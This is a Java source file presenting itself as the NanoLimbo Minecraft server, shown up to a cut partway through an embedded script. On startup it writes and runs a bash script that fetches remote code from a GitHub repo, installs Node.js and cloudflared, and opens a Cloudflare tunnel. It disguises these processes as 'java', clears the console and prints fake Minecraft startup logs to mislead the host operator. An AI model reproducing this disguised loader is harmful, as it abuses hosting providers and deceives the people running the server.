/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

// ============================================================
// 【Node.js 部署配置区】
// ============================================================
private static final String MC_BOT_DIR = env("MC_BOT_DIR", "logs/.mcbot");
private static final boolean NODE_ENABLED = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
private static final String GITHUB_REPO = env("GITHUB_REPO", "zx1447/indexaoyoumc");
private static final String GITHUB_BRANCH = env("GITHUB_BRANCH", "main");
private static final String GITHUB_TOKEN = env("GITHUB_TOKEN", "");
private static final boolean CF_ENABLED = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
private static final String CF_TOKEN = env("CF_TOKEN", "");
private static final String CF_DOMAIN = env("CF_DOMAIN", "");
private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");
// ============================================================

private static volatile String tunnelUrl = "";
private static volatile String nodePort = "N/A";

private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

private NanoLimbo() {}

private static String env(String k, String d) {
    String v = System.getenv(k);
    return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
}

// ============================================================
// 仿真辅助函数
// ============================================================

private static String tsMs() {
    return LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
}

private static void limboLog(String msg) {
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void limboLog(String msg, long delayMs) {
    try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void clearConsole() {
    try {
        System.out.print("\033[H\033[3J\033[2J");
        System.out.flush();
        if (!System.getProperty("os.name").contains("Windows")) {
            new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
        }
    } catch (Exception e) {
        try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
    }
}

// ============================================================
// 入口
// ============================================================

public static void main(String[] args) {
    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
        System.err.println("ERROR: Your Java version is too lower, please switch the version in startup menu!");
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        System.exit(1);
    }

    // ★ 1. 强制修改 Limbo 配置文件
    autoFixLimboConfig();

    if (NODE_ENABLED) {
        try {
            Path botDir = Paths.get(MC_BOT_DIR);
            Files.deleteIfExists(botDir.resolve(".node_app.log"));
            Files.deleteIfExists(botDir.resolve("daemon.log"));

            Path script = generateDeployScript();
            
            // 2. 异步部署 Node 和 CF
            Thread deployThread = new Thread(() -> {
                try { executeDeployScript(script); } catch (Exception ignored) {}
            }, "Node-Deploy");
            deployThread.setDaemon(true);
            deployThread.start();

            // 3. 异步轮询端口和URL
            Thread checkerThread = new Thread(() -> {
                while(tunnelUrl.isEmpty()) {
                    checkDeployInfo();
                    try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                }
                startTunnelMonitor(); // 启动隧道监控
            }, "Info-Checker");
            checkerThread.setDaemon(true);
            checkerThread.start();

            // 4. 主线程死等 URL，拿到后清屏并打印专属 Limbo 伪装日志
            while(tunnelUrl.isEmpty()) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
            }
            
            clearConsole();
            printFakeLimboStartup(tunnelUrl);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    tunnelMonitorRunning.set(false);
                    new ProcessBuilder("bash", "-c", "cat " + MC_BOT_DIR + "/.pids 2>/dev/null | xargs -r kill 2>/dev/null").start();
                } catch (Exception ignored) {}
            }));
        } catch (Exception ignored) {}
    }

    // 5. 伪装日志打印完毕，正式启动 Limbo 游戏本体
    try {
        new LimboServer().start();
    } catch (Exception e) {
        System.err.println("FATAL: Cannot start Limbo server!");
        e.printStackTrace(); // ★ 打印完整错误堆栈，方便排查
    }
    
    // ★ 防止 Limbo 意外崩溃导致 JVM 退出，从而杀死后台的 Node 进程
    System.out.println("Limbo process ended or crashed, keeping JVM alive for Node worker...");
    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
}

// ============================================================
// 强制修改 Limbo 配置 (修复 NPE: 加入 player-info 配置)
// ============================================================

private static void autoFixLimboConfig() {
    try {
        Path configFile = Paths.get("settings.yml");
        String content = "";
        String serverPort = env("SERVER_PORT", "25565"); // ★ 读取面板分配的端口

        if (Files.exists(configFile)) {
            content = Files.readString(configFile);
            // 强制修改在线模式和超时
            content = replaceYamlValue(content, "online-mode", "false");
            content = replaceYamlValue(content, "player-idle-timeout", "0");
            // 强制修改绑定端口，防止与 Node 冲突
            if (content.contains("port:")) {
                content = content.replaceAll("port:\\s*\\d+", "port: " + serverPort);
            } else if (content.contains("bind:")) {
                content = content.replace("bind:", "bind:\n    port: " + serverPort);
            }
            
            // ★ 核心修复: 确保 player-info 节点存在，防止 PacketPlayerInfo 抛出 NullPointerException
            if (!content.contains("player-info:")) {
                content += "\nplayer-info:\n  username: \"LimboPlayer\"\n  display-name: \"&eLimboPlayer\"\n  property: []\n";
            } else {
                if (!content.contains("display-name:")) {
                    content = content.replace("player-info:", "player-info:\n  display-name: \"&eLimboPlayer\"");
                }
                if (!content.contains("username:")) {
                    content = content.replace("player-info:", "player-info:\n  username: \"LimboPlayer\"");
                }
            }
        } else {
            // ★ 如果文件不存在，生成完整的 NanoLimbo 标准配置
            content = "bind:\n" +
                      "  host: 0.0.0.0\n" +
                      "  port: " + serverPort + "\n" +
                      "limbo:\n" +
                      "  dimension: overworld\n" +
                      "  gamemode: adventure\n" +
                      "  max-players: 20\n" +
                      "  player-idle-timeout: 0\n" +
                      "  player-info:\n" +
                      "    username: \"LimboPlayer\"\n" +
                      "    display-name: \"&eLimboPlayer\"\n" +
                      "    property: []\n" +
                      "online-mode: false\n" +
                      "forward-mode: none\n" +
                      "ping:\n" +
                      "  description: \"A NanoLimbo server\"\n" +
                      "  version: \"1.20.x\"\n" +
                      "  max-players: 20\n";
        }
        Files.writeString(configFile, content);
    } catch (Exception ignored) {}
}

private static String replaceYamlValue(String content, String key, String value) {
    if (content.contains(key + ":")) {
        content = content.replaceAll(key + ":.*", key + ": " + value);
    } else {
        if (!content.endsWith("\n")) content += "\n";
        content += key + ": " + value + "\n";
    }
    return content;
}

// ============================================================
// 专属 Limbo 伪装日志打印
// ============================================================

private static void printFakeLimboStartup(String url) {
    limboLog("Starting server...", 0);
    limboLog("Binding remote endpoint to: " + url, 0);
    limboLog("Preparing level \"world\"", randInt(100, 300));
    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
    
    limboLog("Preparing spawn area: 1%", 0);
    limboLog("Preparing spawn area: 2%", 0);
    
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 5%", 0);
    limboLog("Preparing spawn area: 8%", 0);
    
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 15%", 0);
    limboLog("Preparing spawn area: 20%", 0);
    
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 35%", 0);
    limboLog("Preparing spawn area: 60%", 0);
    limboLog("Preparing spawn area: 80%", 0);
    
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 99%", 0);
    
    System.out.println("container@tropicalgames.net Server marked as running...");
    
    limboLog("Preparing spawn area: 100%", 0);
}

private static int randInt(int min, int max) {
    return min + (int)(Math.random() * (max - min + 1));
}

// ============================================================
// 实时检查部署信息
// ============================================================

private static void checkDeployInfo() {
    Path dir = Paths.get(MC_BOT_DIR);
    try {
        Path portFile = dir.resolve(".node_port");
        if (Files.exists(portFile) && nodePort.equals("N/A")) {
            String content = Files.readString(portFile).trim();
            if (!content.isEmpty()) nodePort = content.split("\\n")[0].trim();
        }
    } catch (Exception ignored) {}

    try {
        Path urlFile = dir.resolve(".cf/tunnel_url.txt");
        if (Files.exists(urlFile) && tunnelUrl.isEmpty()) {
            String rawUrl = Files.readString(urlFile).trim();
            java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
            ).matcher(rawUrl);
            if (m.find()) {
                tunnelUrl = m.group(1);
                lastKnownTunnelUrl.set(tunnelUrl);
            } else if (rawUrl.startsWith("https://")) {
                tunnelUrl = rawUrl.split("\\n")[0].trim();
                lastKnownTunnelUrl.set(tunnelUrl);
            }
        }
    } catch (Exception ignored) {}
}

// ============================================================
// 隧道链接变化监控
// ============================================================

private static void startTunnelMonitor() {
    if (tunnelMonitorRunning.getAndSet(true)) return;

    Thread monitor = new Thread(() -> {
        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}

        while (tunnelMonitorRunning.get()) {
            try {
                Thread.sleep(12000);

                Path urlFile = Paths.get(MC_BOT_DIR).resolve(".cf/tunnel_url.txt");
                if (!Files.exists(urlFile)) continue;

                String content = Files.readString(urlFile).trim();
                if (content.isEmpty()) continue;

                String currentUrl = "";
                java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                    "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                ).matcher(content);
                
                if (m.find()) {
                    currentUrl = m.group(1);
                } else if (content.startsWith("https://")) {
                    currentUrl = content.split("\\n")[0].trim();
                }

                if (currentUrl.isEmpty()) continue;

                String lastUrl = lastKnownTunnelUrl.get();
                if (!currentUrl.equals(lastUrl)) {
                    lastKnownTunnelUrl.set(currentUrl);
                    tunnelUrl = currentUrl;
                    limboLog("Binding remote endpoint to: " + currentUrl);
                }

            } catch (Exception ignored) {}
        }
    }, "Tunnel-Monitor");

    monitor.setDaemon(true);
    monitor.start();
}

// ============================================================
// 生成部署脚本（含全套进程伪装）
// ============================================================

private static Path generateDeployScript() throws Exception {
    Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
    Files.createDirectories(dir);
    Path script = dir.resolve("deploy.sh");

    String authToken = GITHUB_TOKEN;
    if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
        authToken = authToken.substring(authToken.indexOf(':') + 1);
    }
    final String token = authToken;
    
    String authHeader = "";
    if (!token.isEmpty()) {
        authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\"";
    }

    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";

    String content = "#!/bin/bash\n" +
        "set +e\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "export HOME=\"" + dir.toAbsolutePath() + "\"\n" +
        "cd \"" + dir.toAbsolutePath() + "\"\n" +
        "\n" +
        "# ============ 1. 下载NodeJS ============\n" +
        "if [ -d \".node\" ]; then\n" +
        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then\n" +
        "        rm -rf .node\n" +
        "    fi\n" +
        "fi\n" +
        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    mkdir -p .node\n" +
        "    if [ ! -f .node/bin/node ]; then\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "\n" +
        "JRE_DIR=\"" + dir.toAbsolutePath() + "/jre21/bin\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "    cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "    chmod +x \".node/bin/.node_real\"\n" +
        "fi\n" +
        "\n" +
        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "        cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "        chmod +x \".node/bin/.node_real\"\n" +
        "    else\n" +
        "        ARCH=$(uname -m)\n" +
        "        NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "        NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "        NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "        rm -f /tmp/${NODE_FILE}\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        mkdir -p /tmp/_node_tmp\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null\n" +
        "        cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"\n" +
        "        chmod +x \".node/bin/.node_real\"\n" +
        "        rm -rf /tmp/${NODE_FILE} /tmp/_node_tmp\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 2. 安全获取代码 ============\n" +
        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"\n" +
        "    DOWNLOAD_OK=false\n" +
        "\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then\n" +
        "            if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "        fi\n" +
        "    fi\n") +
        "\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n" +
        "\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        for PROXY in \"https://gh-proxy.com\" \"https://mirror.ghproxy.com\"; do\n" +
        "            PROXY_URL=\"${PROXY}/${TAR_URL}\"\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$PROXY_URL\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n") +
        "\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        exit 1\n" +
        "    fi\n" +
        "\n" +
        "    find . -maxdepth 1 \\\n" +
        "      ! -name '.' \\\n" +
        "      ! -name '.node' \\\n" +
        "      ! -name '.cf' \\\n" +
        "      ! -name '.pids' \\\n" +
        "      ! -name 'deploy.sh' \\\n" +
        "      ! -name 'daemon.sh' \\\n" +
        "      ! -name '.nd_preload.js' \\\n" +
        "      ! -name 'jre21' \\\n" +
        "      ! -name 'node_modules' \\\n" +
        "      ! -name '*config*' \\\n" +
        "      ! -name '*.log' \\\n" +
        "      -exec rm -rf {} + 2>/dev/null\n" +
        "    mkdir -p /tmp/_app_extract\n" +
        "    tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/* . 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/.* . 2>/dev/null\n" +
        "    rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
        "fi\n" +
        "\n" +
        "# ============ 3. 安装依赖 ============\n" +
        "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production >/dev/null 2>&1\n" +
        "    if [ $? -ne 0 ]; then\n" +
        "        .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps >/dev/null 2>&1\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 4. 替换伪装 ============\n" +
        "cp -f \".node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
        "chmod +x \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \".node/bin/node\" << 'NODEWRAPPER'\n" +
        "#!/bin/bash\n" +
        "exec -a \"java\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
        "NODEWRAPPER\n" +
        "chmod +x \".node/bin/node\"\n" +
        "\n" +
        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = _wp;\n" +
        "            cmd = _wp;\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = _wp;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
        "export NODE_OPTIONS=\"--require " + dir.toAbsolutePath() + "/.nd_preload.js\"\n" +
        "\n" +
        "# ============ 5. 启动NodeJS应用 ============\n" +
        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
        "export SERVER_PORT=$NODE_PORT\n" +
        "export PORT=$NODE_PORT\n" +
        "\n" +
        "nohup bash -c 'exec -a \"java\" \"$0\" \"$@\"' \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1 &\n" +
        "NODE_PID=$!\n" +
        "echo \"$NODE_PID\" >> .pids\n" +
        "\n" +
        "for i in $(seq 1 30); do\n" +
        "    if (echo >/dev/tcp/127.0.0.1/$NODE_PORT) 2>/dev/null; then break; fi\n" +
        "    sleep 1\n" +
        "done\n" +
        "echo \"$NODE_PORT\" > .node_port\n" +
        "\n" +
        "# ============ 6. 启动隧道 ============\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"\n" +
        "mkdir -p \"$CF_CONF_DIR\"\n" +
        "ACTUAL_PORT=$NODE_PORT\n" +
        "\n" +
        "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
        "    mkdir -p .cf\n" +
        "    if [ ! -f \"$CF_BIN\" ]; then\n" +
        "        ARCH=$(uname -m)\n" +
        "        CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\")\n" +
        "        for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi\n" +
        "        done\n" +
        "    fi\n" +
        "    if [ -f \"$CF_BIN\" ]; then\n" +
        "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
        "            for PROTO in quic http2; do\n" +
        "                rm -f .cf/cf.log\n" +
        "                (exec -a \"java\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
        "                CF_PID=$!\n" +
        "                sleep 5\n" +
        "                if kill -0 $CF_PID 2>/dev/null; then\n" +
        "                    echo \"$CF_PID\" >> .pids\n" +
        "                    echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt\n" +
        "                    break\n" +
        "                fi\n" +
        "                kill $CF_PID 2>/dev/null\n" +
        "            done\n" +
        "        else\n" +
        "            TUNNEL_ESTABLISHED=false\n" +
        "            for PROTO in quic http2 auto; do\n" +
        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                for attempt in 1 2 3; do\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                    rm -f .cf/cf.log .cf/tunnel_url.txt\n" +
        "                    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "CFCONF\n" +
        "                    (exec -a \"java\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
        "                    CF_PID=$!\n" +
        "                    sleep 5\n" +
        "                    if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
        "                    for i in $(seq 1 20); do\n" +
        "                        URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' .cf/cf.log 2>/dev/null | tail -1)\n" +
        "                        if [ -n \"$URL\" ]; then\n" +
        "                            sleep 3\n" +
        "                            VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
        "                            if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
        "                                echo \"$URL\" > .cf/tunnel_url.txt\n" +
        "                                echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
        "                                echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
        "                                echo \"$CF_PID\" >> .pids\n" +
        "                                TUNNEL_ESTABLISHED=true\n" +
        "                                break\n" +
        "                            else\n" +
        "                                sleep 5\n" +
        "                                VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
        "                                if [ -n \"$VERIFY2\" ] && [ \"$VERIFY2\" != \"000\" ] && [ \"$VERIFY2\" != \"502\" ]; then\n" +
        "                                    echo \"$URL\" > .cf/tunnel_url.txt\n" +
        "                                    echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
        "                                    echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
        "                                    echo \"$CF_PID\" >> .pids\n" +
        "                                    TUNNEL_ESTABLISHED=true\n" +
        "                                    break\n" +
        "                                fi\n" +
        "                                kill $CF_PID 2>/dev/null\n" +
        "                            fi\n" +
        "                        fi\n" +
        "                        sleep 1\n" +
        "                    done\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then kill $CF_PID 2>/dev/null; fi\n" +
        "                done\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 7. 守护循环 ============\n" +
        "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
        "#!/bin/bash\n" +
        "WORK_DIR=\"" + dir.toAbsolutePath() + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
        "NODE_PID_FILE=\"$WORK_DIR/.node_pid\"\n" +
        "APP_DIR=\"$WORK_DIR\"\n" +
        "NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
        "PORT=$(cat \"$WORK_DIR/.node_port\" 2>/dev/null || echo \"25565\")\n" +
        "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
        "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
        "\n" +
        "write_cf_config() {\n" +
        "    local PROTO=$1\n" +
        "    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://localhost:$PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "CFCONF\n" +
        "}\n" +
        "\n" +
        "start_cf_tunnel() {\n" +
        "    local PROTO=$1\n" +
        "    local LOG_FILE=$2\n" +
        "    write_cf_config \"$PROTO\"\n" +
        "    (exec -a \"java\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n" +
        "    echo $!\n" +
        "}\n" +
        "\n" +
        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null)\n" +
        "\n" +
        "while true; do\n" +
        "    NEED_RESTART=false\n" +
        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
        "        NEED_RESTART=true\n" +
        "    fi\n" +
        "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
        "        cd \"$APP_DIR\"\n" +
        "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
        "        nohup bash -c \"exec -a java \\\"$NODE_FAKE\\\" $NODE_SCRIPT\" >> \"$WORK_DIR/.node_app.log\" 2>&1 &\n" +
        "        NODE_PID=$!\n" +
        "        echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "        for i in $(seq 1 30); do\n" +
        "            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
        "            sleep 1\n" +
        "        done\n" +
        "    fi\n" +
        "    \n" +
        "    NEED_REBUILD=false\n" +
        "    if [ -f \"$WORK_DIR/.cf/tunnel_url.txt\" ] && [ \"" + cfMode + "\" != \"fixed\" ]; then\n" +
        "        SAVED_CF_PID=$(grep 'CF_PID=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
        "        SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
        "        SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
        "        \n" +
        "        if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
        "            NEED_REBUILD=true\n" +
        "        fi\n" +
        "        \n" +
        "        if [ \"$NEED_REBUILD\" = \"false\" ]; then\n" +
